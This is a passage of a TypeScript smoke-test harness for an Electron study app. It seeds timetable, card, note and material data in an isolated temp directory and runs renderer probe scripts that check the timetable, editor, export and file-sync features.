import { BrowserWindow, app } from 'electron'
import { execSync } from 'node:child_process'
import {
  appendFileSync,
  existsSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  renameSync,
  rmSync,
  writeFileSync
} from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, extname, join } from 'node:path'
import { inflateRawSync } from 'node:zlib'

import { NOTION_HASH_KEY, NOTION_ID_KEY, parseNotionId, pushFingerprint } from '@shared/notion'
import { EXPORT_EXTENSIONS } from '@shared/limits'
import type { ExportFormat } from '@shared/types'

import { context } from './context'
import {
  cardsFile,
  ensureDir,
  materialsDir,
  secretsFile,
  setUserDataOverride,
  tempDir
} from './paths'
import { resolveNotesDir } from './services/settings'
import { encodePng } from './services/png'
import { SecretsStore } from './services/secrets'

/**
 * 冒烟 / 端到端自检。
 *
 * 只在环境变量 STUDY_BOARD_SMOKE=1 时启用，正常使用完全不会走到这里。
 *
 * 做了两件正经事：
 *  1. **隔离数据目录**：测试跑在系统临时目录里，绝不碰用户真实的学习数据；
 *  2. **真跑一遍完整链路**：主进程服务 → IPC → 渲染层 → 截图，
 *     这样在 CI 或没人盯着屏幕的时候也能确认「改完没坏」。
 *
 * 场景：
 *  - basic     只验证能起来（默认）
 *  - timetable 额外验证课程表：写入单元格、跑一次真实的图片导入链路、
 *              切到图片模式确认 sb-asset 协议与 CSP 都放行，最后截图
 *  - portal    额外验证网站门户：内置站点、图标走 sb-asset、增删改隐藏全链路
 *  - cards     额外验证课程卡片：翻转、从课表带过课程、建卡片自动建笔记、
 *              「记笔记」跳转、笔记落盘成 Obsidian 认得的文件
 *  - notes     额外验证双模式编辑器：CodeMirror 与 TipTap 的按需加载、
 *              工具栏命令、md ↔ 富文本来回切换、切换前自动备份
 *  - sync      额外验证笔记库文件监听：外部新增 / 改动 / 删除能不能被认出来、
 *              自己写盘会不会造成事件回环、外部改动撞上未保存内容时会不会先问一句
 *  - export    额外验证笔记导出：导出菜单挂得上、md / html / docx / pdf
 *              四种产物都能落到磁盘，而且**内容对得上**
 *  - ai        额外验证 AI 助手与密钥存储：没配密钥时拦在出网之前、
 *              服务商预设联动、本地模型不要求密钥、密钥以密文落盘且能解回
 *
 * 门户场景**不测图标抓取**：那需要真实网络，在无网的 CI 里会让自检变成随机失败。
 * 图标文件由本文件直接造好写进图标目录，测的是「图标能不能显示出来」这条链路，
 * 而不是「能不能从外网抓下来」——后者本来就该由人点一下按钮确认。
 *
 * sync 场景也刻意**不测「换个真编辑器」**：这里直接往磁盘上写文件，
 * 那正是任何外部程序最终做的事——Obsidian 保存、VS Code 保存、记事本保存，
 * 落到文件系统层面都是同一件事。测 IPC 之外那条真实路径才有意义。
 *
 * export 场景**不弹保存对话框**：对话框是系统的，自动化点不了它。
 * 改为直接给 `targetPath`，落在一个临时目录里——这正是对话框之后
 * 主进程会走的那条写入路径，同时让「产物到底对不对」可以被硬断言。
 */

export type SmokeScenario =
  | 'basic'
  | 'timetable'
  | 'portal'
  | 'cards'
  | 'notes'
  | 'sync'
  | 'export'
  | 'ai'
  | 'notion'
  | 'security'
  | 'materials'

export function smokeEnabled(): boolean {
  return process.env['STUDY_BOARD_SMOKE'] === '1'
}

export function smokeScenario(): SmokeScenario {
  const value = process.env['STUDY_BOARD_SMOKE_SCENARIO']
  if (value === 'timetable') return 'timetable'
  if (value === 'portal') return 'portal'
  if (value === 'cards') return 'cards'
  if (value === 'notes') return 'notes'
  if (value === 'sync') return 'sync'
  if (value === 'export') return 'export'
  if (value === 'ai') return 'ai'
  if (value === 'notion') return 'notion'
  if (value === 'security') return 'security'
  if (value === 'materials') return 'materials'
  return 'basic'
}

/**
 * 只要处于任何自动化运行模式（冒烟或基准），就把数据目录挪到临时目录。
 * 必须在 app ready 之前调用。
 */
export function prepareIsolatedDataDir(): void {
  if (!smokeEnabled() && process.env['STUDY_BOARD_BENCH'] !== '1') return
  const dir = mkdtempSync(join(tmpdir(), 'study-board-run-'))
  setUserDataOverride(dir)
  try {
    app.setPath('userData', dir)
  } catch {
    /* 个别平台不允许覆盖，忽略即可——我们自己的数据已经隔离了 */
  }
  // 下载目录一并隔离：资料收件箱默认在「下载目录/StudyBoard收件箱」，
  // 不改的话自动化测试会往用户真实的下载目录里塞文件、弹导入框
  try {
    app.setPath('downloads', join(dir, 'downloads'))
  } catch {
    /* 同上，忽略 */
  }
  console.info(`[自动化] 使用临时数据目录：${dir}`)
}

/* ------------------------------------------------------------------ 造测试数据 */

/** 画一张有明显色块的图，方便截图里一眼看出图片链路通没通 */
function makeTestPng(width: number, height: number): Buffer {
  const rgba = Buffer.alloc(width * height * 4)
  for (let y = 0; y < height; y += 1) {
    for (let x = 0; x < width; x += 1) {
      const i = (y * width + x) * 4
      const band = Math.floor(y / Math.max(1, Math.floor(height / 6)))
      const on = (x + y) % 220 < 110
      rgba[i] = band % 2 === 0 ? 59 : 220
      rgba[i + 1] = on ? 110 : 190
      rgba[i + 2] = band % 2 === 0 ? 240 : 90
      rgba[i + 3] = 255
    }
  }
  return encodePng(rgba, width, height)
}

async function seedTimetable(): Promise<void> {
  const { timetable, settings } = context()

  settings.patch({ timetable: { periodCount: 11 } })

  timetable.setRows([
    { index: 1, start: '08:00', end: '08:45' },
    { index: 2, start: '08:55', end: '09:40' },
    { index: 3, start: '10:00', end: '10:45' },
    { index: 4, start: '10:55', end: '11:40' }
  ])

  timetable.setCell('1:0', {
    courseName: '高等数学 A',
    teacher: '张启明',
    location: '教三-201',
    duration: '45 分钟',
    remark: '带计算器'
  })
  timetable.setCell('1:1', {
    courseName: '大学英语',
    teacher: 'Li Na',
    location: '外语楼 B305',
    duration: '45 分钟',
    remark: ''
  })
  timetable.setCell('3:2', {
    courseName: '数据结构',
    teacher: '王海',
    location: '计算机楼 402',
    duration: '1-2 节连上',
    remark: '每周有上机作业'
  })

  // 走一遍真实的导入链路：PNG → nativeImage → 等比缩放 → 落盘 → 建索引
  const source = join(tmpdir(), `study-board-smoke-${Date.now()}.png`)
  writeFileSync(source, makeTestPng(1800, 1200))
  const result = await timetable.addImages([source])
  console.info(`[smoke] 图片导入：成功 ${result.added} 张，失败 ${result.errors.length} 张`)
  for (const message of result.errors) console.error(`[smoke] 导入失败：${message}`)
  if (result.added !== 1) throw new Error('图片导入链路自检失败')

  const content = timetable.get()
  const image = content.images[0]
  if (!image || image.width <= 0) throw new Error('图片落盘后尺寸信息缺失')
  console.info(
    `[smoke] 图片归一化结果：${image.width}×${image.height}，${Math.round(image.bytes / 1024)} KB`
  )
  if (image.width > 2400) throw new Error('图片没有被等比缩放')
}

/**
 * 卡片测试数据。
 *
 * 同时要种课表：需求里「课程名和老师从课表自动带过来」这条链路，
 * 没有课表数据就根本测不到。
 */
function seedCards(): void {
  const { timetable, cards, notes } = context()

  timetable.setCell('1:0', {
    courseName: '高等数学 A',
    teacher: '张启明',
    location: '教三-201',
    duration: '45 分钟',
    remark: ''
  })
  timetable.setCell('1:1', {
    courseName: '大学英语',
    teacher: 'Li Na',
    location: '外语楼 B305',
    duration: '45 分钟',
    remark: ''
  })
  timetable.setCell('3:2', {
    courseName: '数据结构',
    teacher: '王海',
    location: '计算机楼 402',
    duration: '1-2 节连上',
    remark: ''
  })

  // 只种两张：第三张留给探针从课表带过来新建。
  // 如果连「数据结构」也种上，探针新建时会因为重名变成「数据结构_王海 (2)」，
  // 断言就得跟着变复杂——测试数据不该给测试本身制造歧义。
  const maths = cards.upsert({
    courseName: '高等数学 A',
    teacher: '张启明',
    score: '92',
    difficulty: 4,
    mastery: 3,
    gradingPolicy: '平时 30% + 期末 70%',
    outline: '极限 → 导数 → 积分'
  })
  const english = cards.upsert({
    courseName: '大学英语',
    teacher: 'Li Na',
    score: 'A',
    difficulty: 2,
    mastery: 4
  })
  // 故意放一个超长课程名：卡片高度是写死的，这种名字会不会把内容顶出去，
  // 只有真的摆一张出来才知道。短名字的样本测不到这个
  const longName = cards.upsert({
    courseName: '毛泽东思想和中国特色社会主义理论体系概论',
    teacher: '李建国',
    score: '良好',
    difficulty: 3,
    mastery: 2,
    gradingPolicy: '论文 40% + 期末 60%'
  })

  // 卡片与笔记的关联在真实流程里由 IPC 层建立，这里手工补上等价的结果
  for (const card of [maths, english, longName]) {
    const note = notes.create(`${card.courseName}_${card.teacher}`)
    cards.linkNote(card.id, note.id)
  }
}

/**
 * 安全场景的靶子数据。
 *
 * 与其它 seed 不同，这里种的东西**就是给攻击用的**：
 *  - 一张真实 PNG 走 addImages 导入：协议穿越测试需要「越桶读到一个真实存在的文件」，
 *    拿 404 当结果区分不出「被挡了」和「文件本来就不存在」。
 *    必须走导入而不是直接 writeFileSync——后者不在课表索引里，
 *    会被 sweepOrphanFiles 当无主文件清掉（测试对象被自己的垃圾回收删了，还测什么）
 *  - 一篇笔记：给重命名注入、导出路径攻击当靶子
 */
async function seedSecurity(): Promise<void> {
  const { timetable, notes } = context()
  const png = makeTestPng(24, 24)
  const scratch = join(mkdtempSync(join(tmpdir(), 'sb-seed-')), 'security-probe.png')
  writeFileSync(scratch, png)
  const result = await timetable.addImages([scratch])
  rmSync(dirname(scratch), { recursive: true, force: true })
  if (result.added !== 1) {
    console.error('[smoke] 安全场景的课表图片没种上：', JSON.stringify(result.errors))
  }
  notes.create('安全探针')
}

/**
 * 资料场景的靶子：一张卡片（归属目标）+ 三个待导入的文件。
 *
 * 文件都造在 tempDir 下而不是随便找系统文件——导入会**复制**它们，
 * 用真实系统文件等于偷偷拷贝用户的东西。
 * 「伪装.pdf」内容是文本、扩展名是 pdf：魔数闸口的靶子，它必须被拒收。
 */
async function seedMaterials(): Promise<void> {
  const { cards } = context()
  cards.upsert({ courseName: '高等数学 A', teacher: '张启明' })

  const dir = ensureDir(join(tempDir(context().settings.get().portableMode), 'material-src'))
  const pdf = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< >>\n%%EOF\n'
  writeFileSync(join(dir, '第3章极限.pdf'), pdf, 'binary')
  // PPTX 本质是 zip：PK 头 + 随便一点内容，够过魔数闸就行
  const pptx = Buffer.concat([
    Buffer.from([0x50, 0x4b, 0x03, 0x04]),
    Buffer.from('1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20', 'utf-8')
  ])
  writeFileSync(join(dir, 'week1.pptx'), pptx)
  writeFileSync(join(dir, '伪装.pdf'), '这不是一个 PDF，只是名字像。', 'utf-8')

  // 收件箱的靶子：模拟「浏览器扩展改存进来的下载」
  const inbox = ensureDir(
    join(app.getPath('downloads'), 'StudyBoard收件箱')
  )
  writeFileSync(join(inbox, '教学大纲.pdf'), pdf, 'binary')
}

/**
 * 界面上要用的源文件路径。seed 写到固定目录，探针从这里拿。
 */
function materialSourcePaths(): string[] {
  const dir = join(tempDir(context().settings.get().portableMode), 'material-src')
  return [join(dir, '第3章极限.pdf'), join(dir, 'week1.pptx'), join(dir, '伪装.pdf')]
}

/**
 * 「界面上看得见」不算数：去磁盘上把 attachments/ 翻出来对一遍。
 *
 * 验三件事：文件真的复制进了库（不是只登记了索引）、
 * 改名后磁盘上的旧名字没了新名字在、伪装文件从来没进过库。
 */
function verifyMaterialsOnDisk(): boolean {
  const dir = materialsDir(resolveNotesDir(context().settings.get()))
  let files: string[] = []
  try {
    files = readdirSync(dir).filter((name) => !name.startsWith('.'))
  } catch (error) {
    console.error('[smoke] 读不了资料目录：', error)
    return false
  }
  console.info(`[smoke] 资料库文件：${files.join(' / ') || '（空）'}`)

  const mustHave = '高等数学 A_函数与极限.pdf'
  if (!files.includes(mustHave)) {
    console.error('[smoke] 改名后的文件不在资料库里')
    return false
  }
  if (files.some((name) => name.indexOf('第3章') >= 0 || name.indexOf('week1') >= 0)) {
    console.error('[smoke] 删除 / 改名前的文件还留在库里')
    return false
  }
  if (files.some((name) => name.indexOf('伪装') >= 0)) {
    console.error('[smoke] 伪装文件混进了资料库')
    return false
  }

  try {
    const raw = JSON.parse(readFileSync(join(dir, '.materials.json'), 'utf-8')) as {
      items?: { fileName?: string }[]
    }
    const names = (raw.items ?? []).map((item) => item.fileName ?? '')
    if (!names.includes(mustHave) || !names.includes('高等数学 A_教学大纲.pdf')) {
      console.error('[smoke] 索引与磁盘对不上：', JSON.stringify(names))
      return false
    }
    return true
  } catch (error) {
    console.error('[smoke] 读不了资料索引：', error)
    return false
  }
}

/**
 * 笔记编辑器测试数据。
 *
 * 内容是刻意挑的：标题、加粗、行内代码、列表各来一个——
 * 这些正好是「Markdown 转 HTML 再转回 Markdown」这一圈里最容易走样的几种。
 */
function seedNotes(): void {
  const { notes } = context()
  notes.create(
    '编辑器自检',
    [
      '# 一级标题',
      '',
      '正文段落，带 **加粗** 和 `行内代码`。',
      '',
      '- 列表项一',
      '- 列表项二',
      ''
    ].join('\n')
  )
}

/**
 * 门户测试数据：给内置站点塞一张真图标。
 *
 * 目的是验证「图标目录 → sb-asset 协议 → CSP → <img> 显示」这条链路，
 * 这一步跟「从外网抓」是两件事，只有前者适合放进自动化自检。
 */
function seedPortal(): void {
  const { portal } = context()
  const fileName = portal.writeIcon(makeTestPng(64, 64))
  portal.setIcon('builtin-mooc', fileName)
}

/**
 * 导出测试用的标记文本。
 *
 * 故意做成一眼能认出来的怪字符串：断言是「产物里包含它」，
 * 而这个串不可能被格式转换自己造出来。
 */
const EXPORT_MARKER = '导出标记 MK-7f3a'
const EXPORT_NOTE_TITLE = '导出自检'

/**
 * 导出测试数据。
 *
 * 正文把四种格式各自最容易走样的东西各放一份：标题（docx 里得是真正的
 * 标题样式而不是加粗大字）、行内代码与代码块（等宽 + 底纹）、
 * 表格（docx 里最复杂的结构）、引用、列表、分隔线。
 * 只放一段纯文本的话，导出一份只有一段话的文档也能全绿。
 */
function seedExport(): void {
  const { notes } = context()
  notes.create(
    EXPORT_NOTE_TITLE,
    [
      '# 一级标题',
      '',
      `正文段落，带 **加粗**、*斜体* 和 \`行内代码\`，还有 ${EXPORT_MARKER}。`,
      '',
      '## 二级标题',
      '',
      '- 列表项一',
      '- 列表项二',
      '',
      '1. 有序项一',
      '2. 有序项二',
      '',
      '> 引用一段话',
      '',
      '```js',
      'const answer = 42',
      '```',
      '',
      '| 科目 | 分数 |',
      '| --- | --- |',
      '| 高等数学 | 92 |',
      '',
      '---',
      '',
      '最后一段。',
      ''
    ].join('\n')
  )
}

/* ------------------------------------------------------------------ 渲染层自检 */

/**
 * 注意：`did-finish-load` 可能早于渲染层的异步 bootstrap 完成
 * （bootstrap 里有若干次 IPC 往返），所以探测脚本必须**轮询等元素出现**，
 * 不能一把 querySelector 抓不到就跳过——这正是最初版本踩过的坑。
 */
const PROBE_HELPERS = `
  const wait = (ms) => new Promise((r) => setTimeout(r, ms))
  const waitFor = async (selector, timeout = 15000) => {
    const deadline = Date.now() + timeout
    for (;;) {
      const el = document.querySelector(selector)
      if (el) return el
      if (Date.now() > deadline) return null
      await wait(100)
    }
  }
  const waitForCount = async (selector, count, timeout = 15000) => {
    const deadline = Date.now() + timeout
    for (;;) {
      if (document.querySelectorAll(selector).length === count) return true
      if (Date.now() > deadline) return false
      await wait(100)
    }
  }
  const waitForGone = async (text, timeout = 15000) => {
    const deadline = Date.now() + timeout
    for (;;) {
      if (!document.body.textContent.includes(text)) return true
      if (Date.now() > deadline) return false
      await wait(100)
    }
  }
  // 元素在不在不代表数据到了：输入框是页面搭好就存在的，值要等异步加载才填上
  const waitForValue = async (selector, value, timeout = 15000) => {
    const deadline = Date.now() + timeout
    for (;;) {
      const el = document.querySelector(selector)
      if (el && el.value === value) return true
      if (Date.now() > deadline) return false
      await wait(100)
    }
  }
  const waitForText = async (selector, text, timeout = 15000) => {
    const deadline = Date.now() + timeout
    for (;;) {
      const el = document.querySelector(selector)
      if (el && el.textContent.includes(text)) return true
      if (Date.now() > deadline) return false
      await wait(100)
    }
  }
  // 等一段文字**离开占位值**。占位文案（"加载中…"）是随页面一起渲染的，
  // 所以"元素在"等于什么都没有等到——要等的是它被真实数据换掉
  const waitForTextChange = async (selector, placeholder, timeout = 15000) => {
    const deadline = Date.now() + timeout
    for (;;) {
      const el = document.querySelector(selector)
      const text = el ? el.textContent.trim() : ''
      if (text.length > 0 && text !== placeholder) return text
      if (Date.now() > deadline) return text
      await wait(100)
    }
  }
`

const BASIC_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const shell = await waitFor('study-board-app .sb-shell')

  // 侧栏那行版本号不能把 process.platform 直接摆出来：
  // win32 在 64 位 Windows 上也是 win32，用户会读成「这是 32 位的软件」。
  // 它必须说人话（Windows / macOS / Linux）并且带上位数。
  // 注意这里要等它被数据换掉，不能等元素出现——占位文案是随页面一起画出来的
  const versionText = await waitForTextChange('[data-role="version"]', '加载中…', 10000)
  const rawTokenShown =
    versionText.includes('win32') || versionText.includes('darwin') || versionText.includes('linux')
  const hasOsName =
    versionText.includes('Windows') || versionText.includes('macOS') || versionText.includes('Linux')
  const hasBits = versionText.includes('位') || versionText.includes('ARM')

  return JSON.stringify({
    customElement: Boolean(document.querySelector('study-board-app')),
    mounted: Boolean(shell),
    bridge: typeof window.studyBoard === 'object',
    versionText,
    versionLabelOk: Boolean(versionText && !rawTokenShown && hasOsName && hasBits)
  })
})()`

const TIMETABLE_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const nav = await waitFor('[data-route="timetable"]')
  if (!nav) return JSON.stringify({ error: '导航未就绪' })
  nav.click()

  const editor = await waitFor('input[name="tt-mode"]')
  if (!editor) return JSON.stringify({ error: '课程表编辑页未挂载' })
  await wait(300)

  const cells = document.querySelectorAll('.sb-timetable__cell').length
  const filled = document.querySelectorAll('.sb-ttcell__name').length
  const hasCourse = document.body.textContent.includes('高等数学 A')
  const hasTime = document.body.textContent.includes('08:00')
  const activeNav = document.querySelector('[data-route][aria-current="page"]')?.getAttribute('data-route') ?? 'none'

  // 走一遍「双击 → 填值 → 保存」，确认单格增量重绘这条路径真的把内容画出来了。
  // 整表重绘与单格重绘是两条代码路径，只测其中一条等于没测。
  const targetKey = '5:3'
  const target = document.querySelector('.sb-timetable__cell[data-key="' + targetKey + '"]')
  if (target) {
    target.dispatchEvent(new MouseEvent('dblclick', { bubbles: true, cancelable: true }))
  }
  const nameInput = document.querySelector('.sb-tt-editor [data-field="courseName"]')
  const teacherInput = document.querySelector('.sb-tt-editor [data-field="teacher"]')
  const saveButton = document.querySelector('.sb-tt-editor [data-role="save"]')
  if (nameInput && teacherInput && saveButton) {
    nameInput.value = '编译原理'
    teacherInput.value = '周芷若'
    saveButton.click()
  }

  const painted = await waitFor('.sb-timetable__cell[data-key="' + targetKey + '"] .sb-ttcell__name')
  const paintedText = painted ? painted.textContent : ''
  const paintedMeta = document.querySelector(
    '.sb-timetable__cell[data-key="' + targetKey + '"] .sb-ttcell__meta'
  )
  const editOk = paintedText === '编译原理' && Boolean(paintedMeta && paintedMeta.textContent.includes('周芷若'))
  const filledAfterEdit = document.querySelectorAll('.sb-ttcell__name').length

  // 切到图片模式，确认自定义协议与 CSP 都放行（naturalWidth 只有真的加载成功才不为 0）
  const imageRadio = document.querySelector('input[name="tt-mode"][value="image"]')
  if (imageRadio) {
    imageRadio.checked = true
    imageRadio.dispatchEvent(new Event('change', { bubbles: true }))
  }

  const shot = await waitFor('.sb-ttshot__view img')
  if (shot && !shot.complete) {
    await new Promise((resolve) => {
      shot.addEventListener('load', resolve, { once: true })
      shot.addEventListener('error', resolve, { once: true })
      setTimeout(resolve, 3000)
    })
  }
  const imageWidth = shot ? shot.naturalWidth : 0
  const shots = document.querySelectorAll('.sb-ttshot').length
  // 照片必须被约束在视口内（CSS 里是 max-height: 68vh）。
  // 只看 naturalWidth 是看不出布局问题的——图片解码成功但被拉成原始像素高，
  // 一样会把整页撑爆，所以这里连渲染尺寸一起断言。
  const shotHeight = shot ? shot.getBoundingClientRect().height : 0
  const imageFits = shotHeight > 0 && shotHeight <= window.innerHeight * 0.7

  return JSON.stringify({
    cells, filled, hasCourse, hasTime, shots, imageWidth, activeNav,
    paintedText, filledAfterEdit, shotHeight: Math.round(shotHeight),
    cellsOk: cells === 11 * 7,
    filledOk: filled === 3,
    navOk: activeNav === 'timetable',
    editOk,
    // 保存一格之后，填过的格子数应该只增加 1，而不是整表被重画成别的样子
    filledAfterEditOk: filledAfterEdit === 4,
    imageOk: imageWidth > 0,
    imageFitsOk: imageFits
  })
})()`

const NOTES_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const nav = await waitFor('[data-route="notes"]')
  if (!nav) return JSON.stringify({ error: '导航未就绪' })
  nav.click()

  const listed = await waitForCount('.sb-notes__item', 1)
  if (!listed) return JSON.stringify({ error: '笔记列表为空' })
  document.querySelector('.sb-notes__item').click()

  // 编辑器是动态 import 进来的：这里等它真的挂上，顺便验证
  // 「按需加载的 chunk 在 file:// + CSP 下能不能加载成功」
  const cmReady = await waitFor('.cm-editor', 20000)
  if (!cmReady) return JSON.stringify({ error: 'Markdown 编辑器没挂上' })

  // 标题输入框被填上，才说明笔记内容真的读出来并灌进编辑器了
  const loaded = await waitForValue('[data-role="title"]', '编辑器自检')
  if (!loaded) return JSON.stringify({ error: '笔记内容未载入' })
  await wait(300)

  const initialText = document.querySelector('.cm-content').textContent
  const initialOk = initialText.includes('一级标题') && initialText.includes('列表项一')

  // —— 把光标移到文档末尾，再用工具栏插一条分隔线。
  // 从外面模拟键盘输入到 contenteditable 里太脆弱，走工具栏命令既可靠，
  // 又顺带把「点了按钮到底生不生效」测了；插在末尾则不会破坏原有结构
  const content = document.querySelector('.cm-content')
  const cursorRange = document.createRange()
  cursorRange.selectNodeContents(content)
  cursorRange.collapse(false)
  const selection = window.getSelection()
  selection.removeAllRanges()
  selection.addRange(cursorRange)
  content.focus()
  // 给 CodeMirror 一点时间把 DOM 选区同步成内部光标位置，
  // 不然它还以为光标在文档开头，内容就插到最前面去了
  await wait(250)

  const hrButton = document.querySelector('.sb-editorbar [data-command="hr"]')
  if (!hrButton) return JSON.stringify({ error: '工具栏没渲染' })
  hrButton.click()
  const appended = await waitForText('[data-role="status"]', '已保存', 8000)
  const textAfterHr = document.querySelector('.cm-content').textContent
  const hrOk = textAfterHr.includes('---')
  // 插在末尾 ⇒ 第一行还是原来那个标题。这是「光标真的移到末尾了」的证据
  const firstLine = document.querySelector('.cm-line').textContent
  const h1Kept = firstLine.includes('# 一级标题')

  // 下划线在 Markdown 模式下该是禁用的——Markdown 表达不了它，
  // 与其假装支持再在存盘时丢掉，不如直接不给点
  const underlineDisabled = document.querySelector(
    '.sb-editorbar [data-command="underline"]'
  ).disabled

  // —— 切到富文本：会先弹确认框（提示格式转换可能退化），确认后还要备份
  document.querySelector('[data-mode="richtext"]').click()
  const modal = await waitFor('.sb-modal [data-role="confirm"]')
  if (!modal) return JSON.stringify({ error: '切模式没有弹出确认框' })
  modal.click()

  const rtReady = await waitFor('.sb-rt__body', 20000)
  if (!rtReady) return JSON.stringify({ error: '富文本编辑器没挂上' })
  await wait(400)

  const richHtml = document.querySelector('.sb-rt__body').innerHTML
  // 转换结果的检验点：标题变 h1、加粗变 strong、行内代码变 code、列表变 ul
  const convertOk =
    richHtml.includes('<h1') &&
    richHtml.includes('<strong>') &&
    richHtml.includes('<code>') &&
    richHtml.includes('<ul>')

  // 富文本模式下，下划线该是可用的（这正是富文本存在的意义）
  const underlineEnabled = !document.querySelector(
    '.sb-editorbar [data-command="underline"]'
  ).disabled

  // —— 在富文本里插一张表格，再切回 Markdown 看它有没有变成 GFM 表格语法
  document.querySelector('.sb-editorbar [data-command="table"]').click()
  const tableMade = await waitFor('.sb-rt__body table')
  const savedAfterTable = await waitForText('[data-role="status"]', '已保存', 8000)

  // 切回 Markdown 不需要确认（往富文本切才需要，因为那一步才开始可能丢格式）
  document.querySelector('[data-mode="markdown"]').click()
  const backToCm = await waitFor('.cm-editor', 20000)
  await wait(500)
  const backText = document.querySelector('.cm-content').textContent
  // GFM 表格的样子：至少要有一行 | 分隔符
  const roundTripOk = backText.includes('|') && backText.includes('一级标题')
  const backHead = backText.slice(0, 160)
  const afterHrHead = textAfterHr.slice(0, 160)

  return JSON.stringify({
    initialOk, hrOk, h1Kept, appended, underlineDisabled, convertOk,
    afterHrHead, backHead,
    underlineEnabled, tableMade: Boolean(tableMade), savedAfterTable, roundTripOk,
    richTags: ['h1', 'strong', 'code', 'ul'].filter((t) => richHtml.includes('<' + t)),
    editorOk: initialOk && hrOk && h1Kept && appended,
    toolbarOk: underlineDisabled && underlineEnabled,
    convertCheck: convertOk,
    tableOk: Boolean(tableMade) && savedAfterTable,
    roundTrip: backToCm && roundTripOk
  })
})()`

/* --------------------------------------------------- 文件监听（双向同步） */

/**
 * 「外部程序」写入的那篇笔记。
 *
 * id 写死是有意的：下一步要让一张卡片指着它，好验证「文件被外部删掉之后
 * 卡片会不会自动解开关联」。id 写在文件里，认领时就会被原样捡回来。
 */
const SYNC_EXTERNAL_FILE = '外部新增的笔记.md'
const SYNC_EXTERNAL_ID = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
/** 种子那篇被外部改名之后的名字 */
const SYNC_RENAMED_FILE = '改过名的笔记.md'

const EXTERNAL_APPEND_1 = '外部追加的第一段。'
const EXTERNAL_APPEND_2 = '外部追加的第二段。'
const EXTERNAL_APPEND_3 = '外部追加的第三段。'

/** 打开那篇笔记，并验明「自己写盘不会引起事件回环」 */
/**
 * 导出探针。
 *
 * 一次测两件事：
 *  1. **界面上的导出菜单**——点得开、四种格式齐全、Esc 关得掉；
 *  2. **四种格式真能导出**——明确给 targetPath，绕开系统保存对话框
 *     （对话框是操作系统的，自动化点不了）。
 *
 * 产物本身对不对交给主进程去磁盘上验，这里只把路径带回来。
 * 收尾刻意把菜单重新打开，好让截图里能看到它长什么样。
 */
function exportProbe(dir: string): string {
  return `(async () => {
  ${PROBE_HELPERS}
  const dir = ${JSON.stringify(dir)}
  const base = ${JSON.stringify(EXPORT_NOTE_TITLE)}
  const want = ['md', 'html', 'docx', 'pdf']

  const nav = await waitFor('[data-route="notes"]')
  if (!nav) return JSON.stringify({ error: '导航未就绪' })
  nav.click()

  const listed = await window.studyBoard.notes.list()
  const note = listed.ok ? listed.data.find((n) => n.title === base) : null
  if (!note) return JSON.stringify({ error: '列表里找不到那篇导出自检笔记' })

  const item = await waitFor('[data-role="list"] [data-note="' + note.id + '"]')
  if (!item) return JSON.stringify({ error: '笔记列表里没有那一篇' })
  item.click()
  // 等编辑器真的挂上，别在 open() 还没走完时就去点导出
  await waitFor('[data-role="stage"] .cm-editor', 8000)

  const trigger = await waitFor('[data-action="export"]')
  if (!trigger) return JSON.stringify({ error: '找不到导出按钮' })
  trigger.click()

  const first = await waitFor('.sb-menu [data-format]', 5000)
  if (!first) return JSON.stringify({ error: '导出菜单没弹出来' })

  const items = Array.from(document.querySelectorAll('.sb-menu [data-format]'))
  const formats = items.map((el) => el.getAttribute('data-format'))
  const labels = items.map((el) => (el.textContent || '').trim())

  document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))
  let closed = false
  for (let i = 0; i < 40; i += 1) {
    if (!document.querySelector('.sb-menu')) { closed = true; break }
    await wait(50)
  }

  const results = {}
  for (const format of want) {
    const res = await window.studyBoard.exporter.note({
      noteId: note.id,
      format: format,
      targetPath: dir + '/' + base + '.' + format
    })
    results[format] = res.ok ? (res.data.filePath || '') : ('ERR: ' + res.error)
  }

  trigger.click()
  await waitFor('.sb-menu [data-format]', 5000)

  return JSON.stringify({
    menuOk: formats.length === 4 && want.every((f) => formats.indexOf(f) >= 0) && closed,
    formats: formats,
    labels: labels,
    closed: closed,
    results: results,
    noteId: note.id
  })
})()`
}

const SYNC_OPEN_PROBE = `(async () => {
  ${PROBE_HELPERS}
  const nav = await waitFor('[data-route="notes"]')
  if (!nav) return JSON.stringify({ error: '导航未就绪' })
  nav.click()

  // 顺手把收到的事件记下来：出问题时这几行比任何猜测都管用
  window.__syncEvents = []
  window.studyBoard.events.onLibraryChanged((p) => {
    window.__syncEvents.push(p.kind + ' ' + p.fileName)
  })

  const listed = await waitForCount('.sb-notes__item', 1)
  if (!listed) return JSON.stringify({ error: '笔记列表不是 1 条' })
  document.querySelector('.sb-notes__item').click()

  const cmReady = await waitFor('.cm-editor', 20000)
  const loaded = await waitForValue('[data-role="title"]', '编辑器自检')
  if (!cmReady || !loaded) return JSON.stringify({ error: '笔记没打开' })
  await wait(300)

  // —— 自己写一次盘。自动保存每次落盘都会产生文件事件，没过滤掉的话
  // 用户每打一个字编辑器就会被重建一次。编辑器是不是同一个 DOM 节点，
  // 是这件事最直接、也最不容易假装过去的证据，所以留个引用到后面比
  window.__syncEditorRef = document.querySelector('.cm-editor')
  const hr = document.querySelector('.sb-editorbar [data-command="hr"]')
  if (!hr) return JSON.stringify({ error: '工具栏没渲染' })
  hr.click()
  const saved = await waitForText('[data-role="status"]', '已保存', 8000)
  await wait(2000)

  const same = window.__syncEditorRef === document.querySelector('.cm-editor')
  return JSON.stringify({
    opened: true, saved, noEcho: same,
    selfEvents: window.__syncEvents.slice()
  })
})()`

/** 外部新增一篇：列表要自己长出来 */
const SYNC_ADD_PROBE = `(async () => {
  ${PROBE_HELPERS}
  await waitForCount('.sb-notes__item', 2, 12000)
  // 元素取不到时不要把探针本身弄崩——那样只会得到一句「执行失败」，
  // 什么线索都没有，不如把现场描述清楚
  const list = document.querySelector('[data-role="list"]')
  const listed = list ? list.textContent.includes('外部新增的笔记') : false
  const count = document.querySelectorAll('.sb-notes__item').length
  return JSON.stringify({
    count, listed, hasList: Boolean(list),
    addOk: listed && count === 2,
    events: window.__syncEvents.slice()
  })
})()`

/** 外部改了正在编辑的这篇：编辑器要整个换成磁盘上的新版 */
